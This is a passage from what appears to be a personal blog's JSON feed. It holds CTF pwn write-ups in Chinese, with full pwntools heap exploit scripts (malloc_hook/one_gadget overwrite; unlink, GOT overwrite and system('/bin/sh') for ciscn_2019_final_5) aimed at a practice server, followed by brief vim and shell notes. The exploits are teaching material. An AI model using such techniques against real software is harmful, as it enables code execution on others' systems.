punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input information\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Give me your index : \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">,</span> sex<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Give me your index : \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'change sex?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'Y'</span><span class=\"token keyword\">if</span> sex <span class=\"token keyword\">else</span> <span class=\"token string\">b'N'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'information\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Give me your index : \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>ma_ <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>mh_a <span class=\"token operator\">=</span> ma_ <span class=\"token operator\">-</span> <span class=\"token number\">0x68</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'mh_a:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>mh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>realloc_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'realloc'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>oglist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x45216</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4526a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf02a4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf1147</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> oglist<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span> mh_a<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>realloc_a<span class=\"token operator\">+</span><span class=\"token number\">8</span>  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ciscn_2019_final_5\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_final_5\">#</a> *ciscn_2019_final_5</h1>\n<p>** 考点：** 临界条件，overlap, unlink, tcache dup?</p>\n<p>** 版本：**libc-2.27_3ubuntu1_amd64</p>\n<p>这题算是很有特色的一题。首先保护未全开，pie 未开，relro 未开，可以利用 got 表。</p>\n<p><img data-src=\"./image-20231204203834301.png\" alt=\"image-20231204203834301\"></p>\n<p>总所周知，堆块的分配会进行对齐，因此其地址低三位将固定为 0。而 chunk 头部的 size 也被系统用来存放包括前块 inuse 等的状态码。对于 64 位系统，chunk 是以 0x10 的大小增长，所以二进制第 4 位也为 0 了。</p>\n<p>这道题则是利用这一点，将 chunk 的编号与 chunk 的地址存放在同一个 64 位整数，低 4 位则为编号。因为只有 4 位二进制可供利用，所以其编号范围即为 0~15，每次程序调用块时，会根据用户输入的编号与地址数组中每个元素的低 4 位进行比较，若相同则选中其并操作。</p>\n<p>编号仅能为 0~15，程序因此有对输入的编号进行检测，但漏洞也就出在这。分配函数中的检测不严谨，只当 <code>index&gt;0x11</code>  时保错。若输入为 16，那么可以通过检测。而在存放地址时，低 5 位定会被修改为 1。如果原先块的地址第 5 位为 0，在被强制修改为 1 后，之后操作时，则会对用户地址 + 10 的地方进行操作。因此便可以越界操作 0x10 个字节，构成 overlap。</p>\n<p><img data-src=\"./image-20231204204856295.png\" alt=\"image-20231204204856295\"></p>\n<p>之后就是喜闻乐见的 unlink 实现任意地址读写。但这里并不完全是任意地址，只能对低 4 位为 0 的地址进行读写。例如，要对 free 的 got 表进行改写，那只能修改地址为往前 8 字节处，然后写入时再加上 8 字节偏移。</p>\n<p><img data-src=\"./image-20231204205153497.png\" alt=\"image-20231204205153497\"></p>\n<p>由于没有输出 chunk 的函数，这里先利用释放函数，将 free 的 got 表指向 put 的 plt，然后泄露 libc 地址，再将 free 的 got 表指向 system 函数，最后释放含 <code>&quot;/bin/sh&quot;</code>  字符串的 chunk。</p>\n<p>注意一点，释放 chunk 之后，会清空数组内的地址，此时其低 4 位为 0，因此当输入编号 0 时会选择该空地址进行操作。我们利用 free 函数输出 ptr+0 存放地址对应内容，并将 ptr+0 处清空。由于任意地址读写利用了 ptr+3 处的地址，其对应编号为 0。所以第二次任意地址读写前，需分配一次块，将 ptr+0 处空地址覆盖，以便 ptr+3 正常利用。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'ciscn_final_5'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27135</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x400E89'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'content: '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'content: '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x6020E0</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x98</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> ptr<span class=\"token punctuation\">,</span> ptr<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x420</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token operator\">|</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token operator\">|</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token operator\">|</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "heap",
                "tcache",
                "dup",
                "IO_FILE",
                "calloc",
                "fini_array"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/11/vim/",
            "url": "http://waltcsz.github.io/2023/11/vim/",
            "title": "vim",
            "date_published": "2023-11-16T16:45:03.000Z",
            "content_html": "<h2 id=\"查找\"><a class=\"markdownIt-Anchor\" href=\"#查找\">#</a> 查找</h2>\n<p>斜杠 <code>/</code> + 查找字符串，回车确定。</p>\n<p><code>/string</code></p>\n<p>按 n 下一个，N 上一个。</p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/shell/",
            "url": "http://waltcsz.github.io/2023/11/shell/",
            "title": "shell",
            "date_published": "2023-11-15T10:15:54.000Z",
            "content_html": "<h1 id=\"基础语句格式\"><a class=\"markdownIt-Anchor\" href=\"#基础语句格式\">#</a> 基础语句格式</h1>\n<h2 id=\"语句\"><a class=\"markdownIt-Anchor\" href=\"#语句\">#</a> 语句</h2>\n<p>一行一句，无需结尾标志。</p>\n<p>使用 <code>;</code>  可在同一行执行多条语句。用 <code>;</code>  将不同语句分割。</p>\n<p>使用 <code>|</code>  管道符，将前一语句的结果作为后一语句的参数。</p>\n<h2 id=\"判断\"><a class=\"markdownIt-Anchor\" href=\"#判断\">#</a> 判断</h2>\n<p>判断条件需放在中括号内。</p>\n<p>if 下一行接 <code>then</code>  表示开始执行满足条件时的代码。也可以接在同一行，并用 <code>;</code>  分隔。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token string\">\"<span class=\"token variable\">$obj</span>\"</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\"quit\"</span> <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$obj</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"Quit.\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token 